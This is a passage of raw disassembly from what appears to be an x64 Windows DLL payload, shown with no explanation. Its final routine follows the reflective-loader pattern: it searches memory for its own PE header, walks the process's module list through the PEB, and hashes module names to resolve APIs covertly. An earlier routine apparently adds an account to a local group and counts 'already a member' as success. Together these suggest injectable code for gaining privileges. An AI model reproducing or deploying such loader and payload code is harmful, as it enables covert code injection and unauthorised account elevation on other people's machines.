   1800016ce:	ff 15 ac 6b 01 00    	call   *0x16bac(%rip)        # 0x180018280
   1800016d4:	85 c0                	test   %eax,%eax
   1800016d6:	75 24                	jne    0x1800016fc
   1800016d8:	8d 48 02             	lea    0x2(%rax),%ecx
   1800016db:	e8 18 49 00 00       	call   0x180005ff8
   1800016e0:	4c 8b 05 59 36 02 00 	mov    0x23659(%rip),%r8        # 0x180024d40
   1800016e7:	48 8d 15 72 ef 01 00 	lea    0x1ef72(%rip),%rdx        # 0x180020660
   1800016ee:	48 8b c8             	mov    %rax,%rcx
   1800016f1:	4d 8b 40 08          	mov    0x8(%r8),%r8
   1800016f5:	e8 46 f9 ff ff       	call   0x180001040
   1800016fa:	eb 0c                	jmp    0x180001708
   1800016fc:	48 8d 0d ad ef 01 00 	lea    0x1efad(%rip),%rcx        # 0x1800206b0
   180001703:	e8 88 f9 ff ff       	call   0x180001090
   180001708:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   18000170d:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180001712:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   180001718:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   18000171f:	00 
   180001720:	48 8d 15 79 ee 01 00 	lea    0x1ee79(%rip),%rdx        # 0x1800205a0
   180001727:	33 c9                	xor    %ecx,%ecx
   180001729:	ff 15 49 6b 01 00    	call   *0x16b49(%rip)        # 0x180018278
   18000172f:	85 c0                	test   %eax,%eax
   180001731:	74 0e                	je     0x180001741
   180001733:	48 8d 0d d6 ee 01 00 	lea    0x1eed6(%rip),%rcx        # 0x180020610
   18000173a:	3d 62 05 00 00       	cmp    $0x562,%eax
   18000173f:	75 07                	jne    0x180001748
   180001741:	48 8d 0d 78 ee 01 00 	lea    0x1ee78(%rip),%rcx        # 0x1800205c0
   180001748:	e8 43 f9 ff ff       	call   0x180001090
   18000174d:	b9 01 00 00 00       	mov    $0x1,%ecx
   180001752:	e8 a1 48 00 00       	call   0x180005ff8
   180001757:	48 8b c8             	mov    %rax,%rcx
   18000175a:	e8 0d 4d 00 00       	call   0x18000646c
   18000175f:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   180001764:	48 33 cc             	xor    %rsp,%rcx
   180001767:	e8 74 0b 00 00       	call   0x1800022e0
   18000176c:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   180001773:	5b                   	pop    %rbx
   180001774:	c3                   	ret
   180001775:	cc                   	int3
   180001776:	cc                   	int3
   180001777:	cc                   	int3
   180001778:	cc                   	int3
   180001779:	cc                   	int3
   18000177a:	cc                   	int3
   18000177b:	cc                   	int3
   18000177c:	cc                   	int3
   18000177d:	cc                   	int3
   18000177e:	cc                   	int3
   18000177f:	cc                   	int3
   180001780:	48 83 ec 48          	sub    $0x48,%rsp
   180001784:	83 fa 01             	cmp    $0x1,%edx
   180001787:	74 0a                	je     0x180001793
   180001789:	b8 01 00 00 00       	mov    $0x1,%eax
   18000178e:	48 83 c4 48          	add    $0x48,%rsp
   180001792:	c3                   	ret
   180001793:	4d 85 c0             	test   %r8,%r8
   180001796:	74 42                	je     0x1800017da
   180001798:	49 8b d0             	mov    %r8,%rdx
   18000179b:	e8 30 02 00 00       	call   0x1800019d0
   1800017a0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800017a5:	e8 66 fb ff ff       	call   0x180001310
   1800017aa:	48 8b d0             	mov    %rax,%rdx
   1800017ad:	e8 6e 01 00 00       	call   0x180001920
   1800017b2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800017b7:	e8 f4 00 00 00       	call   0x1800018b0
   1800017bc:	e8 cf 00 00 00       	call   0x180001890
   1800017c1:	48 8b c8             	mov    %rax,%rcx
   1800017c4:	48 8d 15 7d 35 02 00 	lea    0x2357d(%rip),%rdx        # 0x180024d48
   1800017cb:	ff 15 bf 6a 01 00    	call   *0x16abf(%rip)        # 0x180018290
   1800017d1:	48 89 05 68 35 02 00 	mov    %rax,0x23568(%rip)        # 0x180024d40
   1800017d8:	eb 07                	jmp    0x1800017e1
   1800017da:	48 8b 05 5f 35 02 00 	mov    0x2355f(%rip),%rax        # 0x180024d40
   1800017e1:	48 85 c0             	test   %rax,%rax
   1800017e4:	75 21                	jne    0x180001807
   1800017e6:	48 8d 0d f3 ee 01 00 	lea    0x1eef3(%rip),%rcx        # 0x1800206e0
   1800017ed:	e8 fe f8 ff ff       	call   0x1800010f0
   1800017f2:	48 8d 15 0f ef 01 00 	lea    0x1ef0f(%rip),%rdx        # 0x180020708
   1800017f9:	48 8d 0d 20 ef 01 00 	lea    0x1ef20(%rip),%rcx        # 0x180020720
   180001800:	e8 7b fe ff ff       	call   0x180001680
   180001805:	eb 5c                	jmp    0x180001863
   180001807:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   18000180c:	48 8d 15 19 ef 01 00 	lea    0x1ef19(%rip),%rdx        # 0x18002072c
   180001813:	48 8b 58 10          	mov    0x10(%rax),%rbx
   180001817:	48 8b cb             	mov    %rbx,%rcx
   18000181a:	ff 15 f8 67 01 00    	call   *0x167f8(%rip)        # 0x180018018
   180001820:	85 c0                	test   %eax,%eax
   180001822:	75 13                	jne    0x180001837
   180001824:	48 8b 0d 15 35 02 00 	mov    0x23515(%rip),%rcx        # 0x180024d40
   18000182b:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   18000182f:	48 8b 09             	mov    (%rcx),%rcx
   180001832:	e8 49 fe ff ff       	call   0x180001680
   180001837:	48 8d 15 f2 ee 01 00 	lea    0x1eef2(%rip),%rdx        # 0x180020730
   18000183e:	48 8b cb             	mov    %rbx,%rcx
   180001841:	ff 15 d1 67 01 00    	call   *0x167d1(%rip)        # 0x180018018
   180001847:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000184c:	85 c0                	test   %eax,%eax
   18000184e:	75 13                	jne    0x180001863
   180001850:	48 8b 0d e9 34 02 00 	mov    0x234e9(%rip),%rcx        # 0x180024d40
   180001857:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   18000185b:	48 8b 09             	mov    (%rcx),%rcx
   18000185e:	e8 ad fb ff ff       	call   0x180001410
   180001863:	b9 01 00 00 00       	mov    $0x1,%ecx
   180001868:	e8 8b 47 00 00       	call   0x180005ff8
   18000186d:	48 8b c8             	mov    %rax,%rcx
   180001870:	e8 f7 4b 00 00       	call   0x18000646c
   180001875:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000187a:	e8 79 47 00 00       	call   0x180005ff8
   18000187f:	48 8b c8             	mov    %rax,%rcx
   180001882:	e8 e5 4b 00 00       	call   0x18000646c
   180001887:	33 c9                	xor    %ecx,%ecx
   180001889:	ff 15 91 67 01 00    	call   *0x16791(%rip)        # 0x180018020
   18000188f:	cc                   	int3
   180001890:	48 83 3d f0 21 02 00 	cmpq   $0x8,0x221f0(%rip)        # 0x180023a88
   180001897:	08 
   180001898:	48 8d 05 d1 21 02 00 	lea    0x221d1(%rip),%rax        # 0x180023a70
   18000189f:	48 0f 43 05 c9 21 02 	cmovae 0x221c9(%rip),%rax        # 0x180023a70
   1800018a6:	00 
   1800018a7:	c3                   	ret
   1800018a8:	cc                   	int3
   1800018a9:	cc                   	int3
   1800018aa:	cc                   	int3
   1800018ab:	cc                   	int3
   1800018ac:	cc                   	int3
   1800018ad:	cc                   	int3
   1800018ae:	cc                   	int3
   1800018af:	cc                   	int3
   1800018b0:	40 53                	rex push %rbx
   1800018b2:	48 83 ec 20          	sub    $0x20,%rsp
   1800018b6:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   1800018ba:	48 8b d9             	mov    %rcx,%rbx
   1800018bd:	48 83 fa 08          	cmp    $0x8,%rdx
   1800018c1:	72 31                	jb     0x1800018f4
   1800018c3:	48 8b 09             	mov    (%rcx),%rcx
   1800018c6:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1800018cd:	00 
   1800018ce:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800018d5:	72 18                	jb     0x1800018ef
   1800018d7:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   1800018db:	48 83 c2 27          	add    $0x27,%rdx
   1800018df:	49 2b c8             	sub    %r8,%rcx
   1800018e2:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   1800018e6:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800018ea:	77 1f                	ja     0x18000190b
   1800018ec:	49 8b c8             	mov    %r8,%rcx
   1800018ef:	e8 10 0a 00 00       	call   0x180002304
   1800018f4:	33 c0                	xor    %eax,%eax
   1800018f6:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   1800018fd:	00 
   1800018fe:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180001902:	66 89 03             	mov    %ax,(%rbx)
   180001905:	48 83 c4 20          	add    $0x20,%rsp
   180001909:	5b                   	pop    %rbx
   18000190a:	c3                   	ret
   18000190b:	e8 0c 93 00 00       	call   0x18000ac1c
   180001910:	cc                   	int3
   180001911:	cc                   	int3
   180001912:	cc                   	int3
   180001913:	cc                   	int3
   180001914:	cc                   	int3
   180001915:	cc                   	int3
   180001916:	cc                   	int3
   180001917:	cc                   	int3
   180001918:	cc                   	int3
   180001919:	cc                   	int3
   18000191a:	cc                   	int3
   18000191b:	cc                   	int3
   18000191c:	cc                   	int3
   18000191d:	cc                   	int3
   18000191e:	cc                   	int3
   18000191f:	cc                   	int3
   180001920:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001925:	57                   	push   %rdi
   180001926:	48 83 ec 20          	sub    $0x20,%rsp
   18000192a:	48 8d 3d 3f 21 02 00 	lea    0x2213f(%rip),%rdi        # 0x180023a70
   180001931:	48 8b da             	mov    %rdx,%rbx
   180001934:	48 3b fa             	cmp    %rdx,%rdi
   180001937:	74 7f                	je     0x1800019b8
   180001939:	48 8b 15 48 21 02 00 	mov    0x22148(%rip),%rdx        # 0x180023a88
   180001940:	48 83 fa 08          	cmp    $0x8,%rdx
   180001944:	72 35                	jb     0x18000197b
   180001946:	48 8b 0d 23 21 02 00 	mov    0x22123(%rip),%rcx        # 0x180023a70
   18000194d:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   180001954:	00 
   180001955:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000195c:	72 18                	jb     0x180001976
   18000195e:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180001962:	48 83 c2 27          	add    $0x27,%rdx
   180001966:	49 2b c8             	sub    %r8,%rcx
   180001969:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   18000196d:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001971:	77 53                	ja     0x1800019c6
   180001973:	49 8b c8             	mov    %r8,%rcx
   180001976:	e8 89 09 00 00       	call   0x180002304
   18000197b:	66 0f 6f 05 bd ed 01 	movdqa 0x1edbd(%rip),%xmm0        # 0x180020740
   180001982:	00 
   180001983:	33 c9                	xor    %ecx,%ecx
   180001985:	f3 0f 7f 05 f3 20 02 	movdqu %xmm0,0x220f3(%rip)        # 0x180023a80
   18000198c:	00 
   18000198d:	66 89 0d dc 20 02 00 	mov    %cx,0x220dc(%rip)        # 0x180023a70
   180001994:	0f 10 03             	movups (%rbx),%xmm0
   180001997:	0f 11 05 d2 20 02 00 	movups %xmm0,0x220d2(%rip)        # 0x180023a70
   18000199e:	0f 10 4b 10          	movups 0x10(%rbx),%xmm1
   1800019a2:	0f 11 0d d7 20 02 00 	movups %xmm1,0x220d7(%rip)        # 0x180023a80
   1800019a9:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   1800019ad:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   1800019b4:	00 
   1800019b5:	66 89 0b             	mov    %cx,(%rbx)
   1800019b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800019bd:	48 8b c7             	mov    %rdi,%rax
   1800019c0:	48 83 c4 20          	add    $0x20,%rsp
   1800019c4:	5f                   	pop    %rdi
   1800019c5:	c3                   	ret
   1800019c6:	e8 51 92 00 00       	call   0x18000ac1c
   1800019cb:	cc                   	int3
   1800019cc:	cc                   	int3
   1800019cd:	cc                   	int3
   1800019ce:	cc                   	int3
   1800019cf:	cc                   	int3
   1800019d0:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   1800019d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800019de:	00 00 
   1800019e0:	49 ff c0             	inc    %r8
   1800019e3:	42 80 3c 02 00       	cmpb   $0x0,(%rdx,%r8,1)
   1800019e8:	75 f6                	jne    0x1800019e0
   1800019ea:	e9 81 01 00 00       	jmp    0x180001b70
   1800019ef:	cc                   	int3
   1800019f0:	40 53                	rex push %rbx
   1800019f2:	55                   	push   %rbp
   1800019f3:	56                   	push   %rsi
   1800019f4:	57                   	push   %rdi
   1800019f5:	41 54                	push   %r12
   1800019f7:	41 56                	push   %r14
   1800019f9:	41 57                	push   %r15
   1800019fb:	48 83 ec 20          	sub    $0x20,%rsp
   1800019ff:	48 8b 69 18          	mov    0x18(%rcx),%rbp
   180001a03:	4d 8b f0             	mov    %r8,%r14
   180001a06:	4c 8b e2             	mov    %rdx,%r12
   180001a09:	48 8b f9             	mov    %rcx,%rdi
   180001a0c:	4c 3b c5             	cmp    %rbp,%r8
   180001a0f:	77 39                	ja     0x180001a4a
   180001a11:	48 8b f1             	mov    %rcx,%rsi
   180001a14:	48 83 fd 08          	cmp    $0x8,%rbp
   180001a18:	72 03                	jb     0x180001a1d
   180001a1a:	48 8b 31             	mov    (%rcx),%rsi
   180001a1d:	4b 8d 1c 00          	lea    (%r8,%r8,1),%rbx
   180001a21:	4c 89 71 10          	mov    %r14,0x10(%rcx)
   180001a25:	4c 8b c3             	mov    %rbx,%r8
   180001a28:	48 8b ce             	mov    %rsi,%rcx
   180001a2b:	e8 d0 40 00 00       	call   0x180005b00
   180001a30:	45 33 ff             	xor    %r15d,%r15d
   180001a33:	66 44 89 3c 33       	mov    %r15w,(%rbx,%rsi,1)
   180001a38:	48 8b c7             	mov    %rdi,%rax
   180001a3b:	48 83 c4 20          	add    $0x20,%rsp
   180001a3f:	41 5f                	pop    %r15
   180001a41:	41 5e                	pop    %r14
   180001a43:	41 5c                	pop    %r12
   180001a45:	5f                   	pop    %rdi
   180001a46:	5e                   	pop    %rsi
   180001a47:	5d                   	pop    %rbp
   180001a48:	5b                   	pop    %rbx
   180001a49:	c3                   	ret
   180001a4a:	48 bb fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbx
   180001a51:	ff ff 7f 
   180001a54:	4c 3b f3             	cmp    %rbx,%r14
   180001a57:	0f 87 04 01 00 00    	ja     0x180001b61
   180001a5d:	49 8b ce             	mov    %r14,%rcx
   180001a60:	45 33 ff             	xor    %r15d,%r15d
   180001a63:	48 83 c9 07          	or     $0x7,%rcx
   180001a67:	48 3b cb             	cmp    %rbx,%rcx
   180001a6a:	76 06                	jbe    0x180001a72
   180001a6c:	49 8d 4f fe          	lea    -0x2(%r15),%rcx
   180001a70:	eb 4b                	jmp    0x180001abd
   180001a72:	48 8b d5             	mov    %rbp,%rdx
   180001a75:	48 8b c3             	mov    %rbx,%rax
   180001a78:	48 d1 ea             	shr    $1,%rdx
   180001a7b:	48 2b c2             	sub    %rdx,%rax
   180001a7e:	48 3b e8             	cmp    %rax,%rbp
   180001a81:	76 09                	jbe    0x180001a8c
   180001a83:	48 c7 c1 fe ff ff ff 	mov    $0xfffffffffffffffe,%rcx
   180001a8a:	eb 31                	jmp    0x180001abd
   180001a8c:	48 8d 04 2a          	lea    (%rdx,%rbp,1),%rax
   180001a90:	48 8b d9             	mov    %rcx,%rbx
   180001a93:	48 3b c8             	cmp    %rax,%rcx
   180001a96:	48 0f 42 d8          	cmovb  %rax,%rbx
   180001a9a:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   180001aa1:	ff ff 7f 
   180001aa4:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   180001aa8:	48 3b c8             	cmp    %rax,%rcx
   180001aab:	0f 87 aa 00 00 00    	ja     0x180001b5b
   180001ab1:	48 03 c9             	add    %rcx,%rcx
   180001ab4:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   180001abb:	72 28                	jb     0x180001ae5
   180001abd:	48 8d 41 27          	lea    0x27(%rcx),%rax
   180001ac1:	48 3b c1             	cmp    %rcx,%rax
   180001ac4:	0f 86 91 00 00 00    	jbe    0x180001b5b
   180001aca:	48 8b c8             	mov    %rax,%rcx
   180001acd:	e8 3a 08 00 00       	call   0x18000230c
   180001ad2:	48 85 c0             	test   %rax,%rax
   180001ad5:	74 7e                	je     0x180001b55
   180001ad7:	48 8d 70 27          	lea    0x27(%rax),%rsi
   180001adb:	48 83 e6 e0          	and    $0xffffffffffffffe0,%rsi
   180001adf:	48 89 46 f8          	mov    %rax,-0x8(%rsi)
   180001ae3:	eb 12                	jmp    0x180001af7
   180001ae5:	48 85 c9             	test   %rcx,%rcx
   180001ae8:	74 0a                	je     0x180001af4
   180001aea:	e8 1d 08 00 00       	call   0x18000230c
   180001aef:	48 8b f0             	mov    %rax,%rsi
   180001af2:	eb 03                	jmp    0x180001af7
   180001af4:	49 8b f7             	mov    %r15,%rsi
   180001af7:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   180001afb:	49 8b d4             	mov    %r12,%rdx
   180001afe:	4b 8d 1c 36          	lea    (%r14,%r14,1),%rbx
   180001b02:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   180001b06:	4c 8b c3             	mov    %rbx,%r8
   180001b09:	48 8b ce             	mov    %rsi,%rcx
   180001b0c:	e8 ef 3f 00 00       	call   0x180005b00
   180001b11:	66 44 89 3c 33       	mov    %r15w,(%rbx,%rsi,1)
   180001b16:	48 83 fd 08          	cmp    $0x8,%rbp
   180001b1a:	72 31                	jb     0x180001b4d
   180001b1c:	48 8b 0f             	mov    (%rdi),%rcx
   180001b1f:	48 8d 14 6d 02 00 00 	lea    0x2(,%rbp,2),%rdx
   180001b26:	00 
   180001b27:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001b2e:	72 18                	jb     0x180001b48
   180001b30:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180001b34:	48 83 c2 27          	add    $0x27,%rdx
   180001b38:	49 2b c8             	sub    %r8,%rcx
   180001b3b:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180001b3f:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001b43:	77 10                	ja     0x180001b55
   180001b45:	49 8b c8             	mov    %r8,%rcx
   180001b48:	e8 b7 07 00 00       	call   0x180002304
   180001b4d:	48 89 37             	mov    %rsi,(%rdi)
   180001b50:	e9 e3 fe ff ff       	jmp    0x180001a38
   180001b55:	e8 c2 90 00 00       	call   0x18000ac1c
   180001b5a:	cc                   	int3
   180001b5b:	e8 f0 f6 ff ff       	call   0x180001250
   180001b60:	cc                   	int3
   180001b61:	e8 8a f7 ff ff       	call   0x1800012f0
   180001b66:	cc                   	int3
   180001b67:	cc                   	int3
   180001b68:	cc                   	int3
   180001b69:	cc                   	int3
   180001b6a:	cc                   	int3
   180001b6b:	cc                   	int3
   180001b6c:	cc                   	int3
   180001b6d:	cc                   	int3
   180001b6e:	cc                   	int3
   180001b6f:	cc                   	int3
   180001b70:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001b75:	55                   	push   %rbp
   180001b76:	56                   	push   %rsi
   180001b77:	41 56                	push   %r14
   180001b79:	48 83 ec 30          	sub    $0x30,%rsp
   180001b7d:	48 8b 05 8c 14 02 00 	mov    0x2148c(%rip),%rax        # 0x180023010
   180001b84:	48 33 c4             	xor    %rsp,%rax
   180001b87:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001b8c:	48 8b 2d d5 1e 02 00 	mov    0x21ed5(%rip),%rbp        # 0x180023a68
   180001b93:	49 8b f0             	mov    %r8,%rsi
   180001b96:	4c 8b f2             	mov    %rdx,%r14
   180001b99:	4c 3b c5             	cmp    %rbp,%r8
   180001b9c:	77 2b                	ja     0x180001bc9
   180001b9e:	48 83 fd 10          	cmp    $0x10,%rbp
   180001ba2:	4c 89 05 b7 1e 02 00 	mov    %r8,0x21eb7(%rip)        # 0x180023a60
   180001ba9:	48 8d 1d a0 1e 02 00 	lea    0x21ea0(%rip),%rbx        # 0x180023a50
   180001bb0:	48 0f 43 1d 98 1e 02 	cmovae 0x21e98(%rip),%rbx        # 0x180023a50
   180001bb7:	00 
   180001bb8:	48 8b cb             	mov    %rbx,%rcx
   180001bbb:	e8 40 3f 00 00       	call   0x180005b00
   180001bc0:	c6 04 1e 00          	movb   $0x0,(%rsi,%rbx,1)
   180001bc4:	e9 fb 00 00 00       	jmp    0x180001cc4
   180001bc9:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   180001bd0:	ff ff 7f 
   180001bd3:	48 3b f3             	cmp    %rbx,%rsi
   180001bd6:	0f 87 0a 01 00 00    	ja     0x180001ce6
   180001bdc:	48 8b ce             	mov    %rsi,%rcx
   180001bdf:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   180001be4:	48 83 c9 0f          	or     $0xf,%rcx
   180001be8:	48 3b cb             	cmp    %rbx,%rcx
   180001beb:	77 3a                	ja     0x180001c27
   180001bed:	48 8b d5             	mov    %rbp,%rdx
   180001bf0:	48 8b c3             	mov    %rbx,%rax
   180001bf3:	48 d1 ea             	shr    $1,%rdx
   180001bf6:	48 2b c2             	sub    %rdx,%rax
   180001bf9:	48 3b e8             	cmp    %rax,%rbp
   180001bfc:	77 29                	ja     0x180001c27
   180001bfe:	48 8d 04 2a          	lea    (%rdx,%rbp,1),%rax
   180001c02:	48 8b d9             	mov    %rcx,%rbx
   180001c05:	48 3b c8             	cmp    %rax,%rcx
   180001c08:	48 0f 42 d8          	cmovb  %rax,%rbx
   180001c0c:	48 8d 43 01          	lea    0x1(%rbx),%rax
   180001c10:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   180001c16:	72 35                	jb     0x180001c4d
   180001c18:	48 8d 48 27          	lea    0x27(%rax),%rcx
   180001c1c:	48 3b c8             	cmp    %rax,%rcx
   180001c1f:	0f 86 c7 00 00 00    	jbe    0x180001cec
   180001c25:	eb 0a                	jmp    0x180001c31
   180001c27:	48 b9 27 00 00 00 00 	movabs $0x8000000000000027,%rcx
   180001c2e:	00 00 80 
   180001c31:	e8 d6 06 00 00       	call   0x18000230c
   180001c36:	48 85 c0             	test   %rax,%rax
   180001c39:	0f 84 b3 00 00 00    	je     0x180001cf2
   180001c3f:	48 8d 78 27          	lea    0x27(%rax),%rdi
   180001c43:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   180001c47:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   180001c4b:	eb 14                	jmp    0x180001c61
   180001c4d:	48 85 c0             	test   %rax,%rax
   180001c50:	74 0d                	je     0x180001c5f
   180001c52:	48 8b c8             	mov    %rax,%rcx
   180001c55:	e8 b2 06 00 00       	call   0x18000230c
   180001c5a:	48 8b f8             	mov    %rax,%rdi
   180001c5d:	eb 02                	jmp    0x180001c61
   180001c5f:	33 ff                	xor    %edi,%edi
   180001c61:	4c 8b c6             	mov    %rsi,%r8
   180001c64:	48 89 35 f5 1d 02 00 	mov    %rsi,0x21df5(%rip)        # 0x180023a60
   180001c6b:	49 8b d6             	mov    %r14,%rdx
   180001c6e:	48 89 1d f3 1d 02 00 	mov    %rbx,0x21df3(%rip)        # 0x180023a68
   180001c75:	48 8b cf             	mov    %rdi,%rcx
   180001c78:	e8 83 3e 00 00       	call   0x180005b00
   180001c7d:	c6 04 3e 00          	movb   $0x0,(%rsi,%rdi,1)
   180001c81:	48 83 fd 10          	cmp    $0x10,%rbp
   180001c85:	72 31                	jb     0x180001cb8
   180001c87:	48 8b 0d c2 1d 02 00 	mov    0x21dc2(%rip),%rcx        # 0x180023a50
   180001c8e:	48 8d 55 01          	lea    0x1(%rbp),%rdx
   180001c92:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001c99:	72 18                	jb     0x180001cb3
   180001c9b:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180001c9f:	48 83 c2 27          	add    $0x27,%rdx
   180001ca3:	49 2b c8             	sub    %r8,%rcx
   180001ca6:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180001caa:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001cae:	77 42                	ja     0x180001cf2
   180001cb0:	49 8b c8             	mov    %r8,%rcx
   180001cb3:	e8 4c 06 00 00       	call   0x180002304
   180001cb8:	48 89 3d 91 1d 02 00 	mov    %rdi,0x21d91(%rip)        # 0x180023a50
   180001cbf:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   180001cc4:	48 8d 05 85 1d 02 00 	lea    0x21d85(%rip),%rax        # 0x180023a50
   180001ccb:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   180001cd0:	48 33 cc             	xor    %rsp,%rcx
   180001cd3:	e8 08 06 00 00       	call   0x1800022e0
   180001cd8:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   180001cdd:	48 83 c4 30          	add    $0x30,%rsp
   180001ce1:	41 5e                	pop    %r14
   180001ce3:	5e                   	pop    %rsi
   180001ce4:	5d                   	pop    %rbp
   180001ce5:	c3                   	ret
   180001ce6:	e8 05 f6 ff ff       	call   0x1800012f0
   180001ceb:	cc                   	int3
   180001cec:	e8 5f f5 ff ff       	call   0x180001250
   180001cf1:	cc                   	int3
   180001cf2:	e8 25 8f 00 00       	call   0x18000ac1c
   180001cf7:	cc                   	int3
   180001cf8:	cc                   	int3
   180001cf9:	cc                   	int3
   180001cfa:	cc                   	int3
   180001cfb:	cc                   	int3
   180001cfc:	cc                   	int3
   180001cfd:	cc                   	int3
   180001cfe:	cc                   	int3
   180001cff:	cc                   	int3
   180001d00:	48 8b 04 24          	mov    (%rsp),%rax
   180001d04:	c3                   	ret
   180001d05:	cc                   	int3
   180001d06:	cc                   	int3
   180001d07:	cc                   	int3
   180001d08:	cc                   	int3
   180001d09:	cc                   	int3
   180001d0a:	cc                   	int3
   180001d0b:	cc                   	int3
   180001d0c:	cc                   	int3
   180001d0d:	cc                   	int3
   180001d0e:	cc                   	int3
   180001d0f:	cc                   	int3
   180001d10:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180001d15:	53                   	push   %rbx
   180001d16:	41 56                	push   %r14
   180001d18:	41 57                	push   %r15
   180001d1a:	48 83 ec 40          	sub    $0x40,%rsp
   180001d1e:	48 89 6c 24 78       	mov    %rbp,0x78(%rsp)
   180001d23:	45 33 ff             	xor    %r15d,%r15d
   180001d26:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   180001d2b:	33 f6                	xor    %esi,%esi
   180001d2d:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   180001d32:	45 33 e4             	xor    %r12d,%r12d
   180001d35:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180001d3a:	45 33 ed             	xor    %r13d,%r13d
   180001d3d:	4c 89 7c 24 70       	mov    %r15,0x70(%rsp)
   180001d42:	e8 b9 ff ff ff       	call   0x180001d00
   180001d47:	48 8b e8             	mov    %rax,%rbp
   180001d4a:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180001d4f:	90                   	nop
   180001d50:	66 39 45 00          	cmp    %ax,0x0(%rbp)
   180001d54:	75 1a                	jne    0x180001d70
   180001d56:	48 63 55 3c          	movslq 0x3c(%rbp),%rdx
   180001d5a:	48 8d 4a c0          	lea    -0x40(%rdx),%rcx
   180001d5e:	48 81 f9 bf 03 00 00 	cmp    $0x3bf,%rcx
   180001d65:	77 09                	ja     0x180001d70
   180001d67:	81 3c 2a 50 45 00 00 	cmpl   $0x4550,(%rdx,%rbp,1)
   180001d6e:	74 05                	je     0x180001d75
   180001d70:	48 ff cd             	dec    %rbp
   180001d73:	eb db                	jmp    0x180001d50
   180001d75:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   180001d7c:	00 00 
   180001d7e:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   180001d84:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   180001d89:	48 89 6c 24 68       	mov    %rbp,0x68(%rsp)
   180001d8e:	48 8b 48 18          	mov    0x18(%rax),%rcx
   180001d92:	4c 8b 71 20          	mov    0x20(%rcx),%r14
   180001d96:	4d 85 f6             	test   %r14,%r14
   180001d99:	0f 84 c5 01 00 00    	je     0x180001f64
   180001d9f:	bf ff ff 00 00       	mov    $0xffff,%edi
   180001da4:	41 8d 5b 02          	lea    0x2(%r11),%ebx
   180001da8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180001daf:	00 
   180001db0:	49 8b 56 50          	mov    0x50(%r14),%rdx
   180001db4:	33 c0                	xor    %eax,%eax
   180001db6:	45 0f b7 46 48       	movzwl 0x48(%r14),%r8d
   180001dbb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001dc0:	0f b6 0a             	movzbl (%rdx),%ecx
   180001dc3:	c1 c8 0d             	ror    $0xd,%eax
   180001dc6:	80 f9 61             	cmp    $0x61,%cl
   180001dc9:	72 04                	jb     0x180001dcf
   180001dcb:	48 83 c0 e0          	add    $0xffffffffffffffe0,%rax
   180001dcf:	48 03 c1             	add    %rcx,%rax
   180001dd2:	48 ff c2             	inc    %rdx
   180001dd5:	66 44 03 c7          	add    %di,%r8w
   180001dd9:	75 e5                	jne    0x180001dc0
